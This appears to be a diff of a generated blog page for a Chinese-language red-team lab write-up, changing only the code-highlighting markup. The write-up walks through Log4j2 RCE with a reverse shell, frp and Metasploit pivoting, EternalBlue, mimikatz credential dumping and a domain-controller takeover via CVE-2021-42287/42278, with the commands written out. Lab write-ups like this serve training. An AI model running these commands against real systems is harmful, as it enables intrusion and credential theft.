@@ -194,14 +194,14 @@
   
 
   <div class="content" itemprop="articleBody">
-    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理</span><br></pre></td></tr></table></figure>
+    <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：log4j2 RCE、CVE<span class="string">-2021</span><span class="string">-42287</span>、CVE<span class="string">-2021</span><span class="string">-42278</span>、MS17<span class="string">-010</span>漏洞利用、frp内网穿透、MSF搭建socks代理</span><br></pre></td></tr></table></figure>
 
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次靶场是 <strong>渗透攻击红队</strong> 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：</p>
 <p><img src="https://s2.loli.net/2021/12/25/nUgrAER1a7uck4T.png"></p>
 <p>PS：靶场下载地址关注微信公众号：<strong>红队攻防实验室</strong> 回复：<strong>001</strong> 即可获取到下载地址。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu Desktop ip：192.168.124.8（模拟服务器公网ip）</span><br><span class="line">Kali ip：192.168.124.7</span><br></pre></td></tr></table></figure>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ubuntu</span> Desktop <span class="built_in">ip</span>：<span class="number">192</span>.<span class="number">168</span>.<span class="number">124</span>.<span class="number">8</span>（模拟服务器公网<span class="built_in">ip</span>）</span><br><span class="line"><span class="symbol">Kali</span> <span class="built_in">ip</span>：<span class="number">192</span>.<span class="number">168</span>.<span class="number">124</span>.<span class="number">7</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.124.8</span><br></pre></td></tr></table></figure>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV -p- <span class="number">192.168.124.8</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png"></p>
 <p>一台Ubuntu机器，开放了两个端口<code>22</code>、<code>38080</code></p>
@@ -213,7 +213,7 @@
 <h2 id="CVE-2021-44228漏洞利用"><a href="#CVE-2021-44228漏洞利用" class="headerlink" title="CVE-2021-44228漏洞利用"></a>CVE-2021-44228漏洞利用</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">工具</a>在<strong>Kali</strong>终端（192.168.124.7）开启一个LDAP：</p>
 <p><img src="https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png"></p>
 <p>并开启一个监听端口，来接收反弹的shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lnvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png"></p>
 <p>使用EXP成功反弹shell</p>
@@ -228,19 +228,19 @@
 <p><code>ifconfig</code>发现该机器有双网卡，其中 <code>ens33</code> 是外网的网卡，<code>ens38</code> （10.0.1.6）是内网网卡</p>
 <p><img src="https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png"></p>
 <p>我们用 <code>for</code> 循环 <code>ping</code> 一下 <code>ens38</code> 的 <code>C</code> 段：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">for</span> i in <span class="number">10</span>.<span class="number">0</span>.<span class="number">1</span>.&#123;<span class="number">1</span>..<span class="number">254</span>&#125;; do if ping -c <span class="number">3</span> -w <span class="number">3</span> $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done</span><br></pre></td></tr></table></figure>
 
 <p>发现有一台存活主机<code>10.0.1.7</code></p>
 <p><img src="https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png"></p>
 <h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><h3 id="frp流量转发"><a href="#frp流量转发" class="headerlink" title="frp流量转发"></a>frp流量转发</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp"><strong>frp</strong></a>将已获取到权限的<code>Ubuntu</code>的流量代理出来，这样就可以通过<code>Kali</code>来对内网存活主机进行渗透了</p>
 <p>我们先要将<code>frp</code>上传到<code>Ubuntu</code>中，在<code>Kali</code>开启一个<code>HTTP</code>服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png"></p>
 <p>然后在<code>Ubuntu</code>中下载</p>
 <p><img src="https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png"></p>
 <p>在<code>Ubuntu</code>中给予<code>frp.tar.gz</code>执行权限，并解压</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frp.tar.gz</span><br><span class="line">tar -zxvf frp.tar.gz</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frp<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">tar -zxvf frp<span class="selector-class">.tar</span>.gz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png"></p>
 <p>进入<code>frp</code>目录，配置好<code>frpc.ini</code></p>
@@ -251,56 +251,56 @@
 <p><img src="https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png"></p>
 <p>此时<code>Kali</code>的服务端就有响应了</p>
 <p><img src="https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png"></p>
-<h3 id="MSF设置Socks-代理"><a href="#MSF设置Socks-代理" class="headerlink" title="MSF设置Socks 代理"></a>MSF设置Socks 代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setg Proxies socks5:192.168.124.7:7777</span><br><span class="line">setg ReverseAllowProxy true</span><br></pre></td></tr></table></figure>
+<h3 id="MSF设置Socks-代理"><a href="#MSF设置Socks-代理" class="headerlink" title="MSF设置Socks 代理"></a>MSF设置Socks 代理</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">setg</span> Proxies socks5:<span class="number">192.168.124.7:7777</span></span><br><span class="line">setg ReverseAllowProxy <span class="literal">true</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png"></p>
 <p>使用 <code>smb</code> 版本探测模块对目标进行扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 10.0.1.7</span><br></pre></td></tr></table></figure>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="keyword">set</span> rhosts <span class="number">10.0</span><span class="number">.1</span><span class="number">.7</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png"></p>
 <p>发现目标 <code>10.0.1.7</code>系统 版本是 <code>Windows 7</code>，且存在域 <code>REDTEAM</code></p>
 <p>接着探测目标是否存在经典的<code>MS17-010</code>漏洞</p>
-<h3 id="MS17-010-漏洞探测与利用"><a href="#MS17-010-漏洞探测与利用" class="headerlink" title="MS17-010 漏洞探测与利用"></a>MS17-010 漏洞探测与利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 10.0.1.7</span><br></pre></td></tr></table></figure>
+<h3 id="MS17-010-漏洞探测与利用"><a href="#MS17-010-漏洞探测与利用" class="headerlink" title="MS17-010 漏洞探测与利用"></a>MS17-010 漏洞探测与利用</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="number">17</span>_<span class="number">010</span></span><br><span class="line"><span class="attribute">set</span> rhosts <span class="number">10.0.1.7</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png"></p>
 <p>目标主机<code>win7</code>确实存在<code>永恒之蓝</code>漏洞</p>
 <p>接下来我们继续使用<code>MSF</code>的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的<code>payload</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 10.0.1.7</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">use</span> windows/smb/ms<span class="number">17</span>_<span class="number">010</span>_eternalblue</span><br><span class="line"><span class="attribute">set</span> payload windows/x<span class="number">64</span>/meterpreter/bind_tcp</span><br><span class="line"><span class="attribute">set</span> rhosts <span class="number">10.0.1.7</span></span><br><span class="line"><span class="attribute">run</span></span><br></pre></td></tr></table></figure>
 
 <img src="https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png" style="zoom: 80%;" />
 
 <p>成功获得一个<code>meterpreter</code></p>
 <p><img src="https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png"></p>
 <p>拿到 <code>Win7</code> 权限后加载 <code>Mimikatz</code> 抓取明文密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">load mimikatz</span></span><br><span class="line"><span class="attribute">creds_all</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png"></p>
 <p>此时我们得到了一个域用户的账号密码</p>
-<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br><span class="line">net user /domain</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br><span class="line">net <span class="keyword">user</span> <span class="title">/domain</span></span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png"></p>
 <p><img src="https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png"></p>
 <p>发现<code>win7</code>还有一个内网网卡，接着我们需要定位域控</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br><span class="line">ping DC</span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="keyword">group</span> &quot;Domain Controllers&quot; /<span class="keyword">domain</span></span><br><span class="line">ping DC</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png"></p>
 <p>定位到域控到域控 <code>IP</code> 为 <code>10.0.0.12</code> ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278</p>
 <p><strong>具体：</strong><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect">只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）</a></p>
 <h3 id="MSF流量转发"><a href="#MSF流量转发" class="headerlink" title="MSF流量转发"></a>MSF流量转发</h3><p>我们先将<code>win7</code>的流量代理出来，然后在<code>Kali</code>中实现域内提权</p>
 <p>先添加路由：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 10.0.0.7/24</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">run</span> autoroute -s <span class="number">10.0.0.7</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png"></p>
 <p>使用 MSF 添加了一个 Socks：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png"></p>
 <p>接着修改<code>proxychain</code>配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>proxychains4.conf</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png"></p>
 <p>直接使用<a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">脚本</a>利用漏洞进行域内提权</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell</span><br></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains <span class="keyword">python3</span> sam_the_admin.<span class="keyword">py</span> <span class="string">&quot;redteam/root:Red12345&quot;</span> -dc-ip <span class="number">10.0</span>.<span class="number">0.12</span> -<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png"></p>
 <p>最后拿到最终的flag</p>
